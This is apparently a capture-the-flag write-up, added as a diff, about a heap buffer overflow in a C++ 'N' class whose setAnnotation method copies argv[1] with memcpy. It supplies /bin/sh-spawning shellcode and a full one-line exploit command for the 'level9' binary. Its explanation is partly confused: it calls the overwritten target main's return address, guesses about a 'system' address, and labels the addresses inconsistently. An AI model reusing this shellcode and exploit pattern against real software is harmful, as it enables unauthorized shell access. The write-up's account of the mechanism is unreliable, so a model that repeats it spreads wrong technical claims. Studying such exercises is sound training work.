@@ -1,0 +1,50 @@
+# Buffer Overflow with C++
+
+### Code Analysis:
+
+1. **The `N` class and its methods:**
+   - **`N::N(int32_t* arg1, int32_t arg2)`**: This constructor takes two arguments, `arg1` (a pointer to an integer) and `arg2` (an integer). 
+     - The constructor sets `*arg1 = 0x8048848`, which stores the value `0x8048848` at the memory location pointed to by `arg1`.
+     - It also modifies the memory at `arg1 + 0x1a` (which is 26 elements away) by assigning it the value `arg2`. This is a potential overflow point.
+     - The constructor returns `arg1` as a pointer to the first argument.
+   
+   - **`N::setAnnotation(char* arg2)`**: This method copies a string (`arg2`) into the memory starting at `this + 4` (which is the `N` object's member area). It uses `memcpy` to perform the copy, which does not check for buffer boundaries. This can lead to a buffer overflow if the size of `arg2` exceeds the allocated space.
+
+2. **The `main` function:**
+   - The program expects an argument (`argv[1]`) to be passed in and checks if it is provided. If not, it exits.
+   - Two instances of `N` are created with values `5` and `6`, respectively (`obj1` and `obj2`).
+   - The `setAnnotation` method is called on `obj1`, passing `argv[1]` (which is the user's input). This is the point where the vulnerability lies—because `argv[1]` is not validated for size, it can overflow the buffer in `setAnnotation`.
+
+3. **The Vulnerability:**
+   - **Buffer Overflow**: Since `setAnnotation` uses `memcpy` to copy `argv[1]` into `this + 4` (essentially part of the `N` object), an attacker can provide a large input to overflow the buffer and overwrite adjacent memory. Specifically, by providing a carefully crafted input, an attacker can overwrite critical parts of memory, including return addresses or function pointers.
+   - The goal is to overwrite the return address of the `main` function or a function pointer, causing the program to execute arbitrary code (a shellcode in this case).
+
+4. **The Exploit:**
+   - The shellcode will be injected via `argv[1]`. The shellcode we will use is:
+     ```
+     "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
+     ```
+     This shellcode is a simple one that spawns `/bin/sh` when executed.
+
+   - We need to provide the following:
+     1. **Address of the function to overwrite**: This is usually the return address of the `main` function or a function pointer. In this case, we overwrite a critical value (in this case, the return address) to jump to our shellcode.
+     2. **Padding**: Fill the space between the start of `argv[1]` and the memory location we want to overwrite.
+     3. **The address of the shellcode**: After overflowing the buffer, we need to provide the address where the shellcode is placed, which is typically a stack address or somewhere where the shellcode can reside.
+
+   - The memory address of `0x10a00408` seems to point to a location where we want to jump to. This could be the address of the `system` function or any other function that can lead to the execution of the shellcode.
+
+   **Exploit Command:**
+   ```
+   ./level9 $(python -c 'print("\x10\xa0\x04\x08" + "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80" + "A" * (104 - 21) + "\x0c\xa0\x04\x08")')
+   ```
+
+   - **Exploit Breakdown**:
+     1. **`\x10\xa0\x04\x08`**: This is the address where we want to overwrite, which could be the return address or function pointer that we want to change.
+     2. **Shellcode**: `"\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"` is the shellcode that spawns `/bin/sh`.
+     3. **Padding**: `"A" * (104 - 21)`: This fills the space in the buffer between the start of the input and the point where we overwrite memory. We subtract 21 from 104 to account for the length of the shellcode.
+     4. **`\x0c\xa0\x04\x08`**: This is the address where we want to redirect the control flow, which could be where the `main` function’s return address is stored.
+
+   When the program executes, it will jump to the shellcode, spawning a shell with `/bin/sh`.
+
+### Conclusion:
+This vulnerability arises from a **buffer overflow** in the `setAnnotation` method, where the `argv[1]` input is copied into an unbounded memory area. By carefully crafting an input, an attacker can overwrite a critical function pointer or return address to redirect the program’s flow and execute arbitrary shellcode, ultimately giving the attacker a shell (`/bin/sh`).
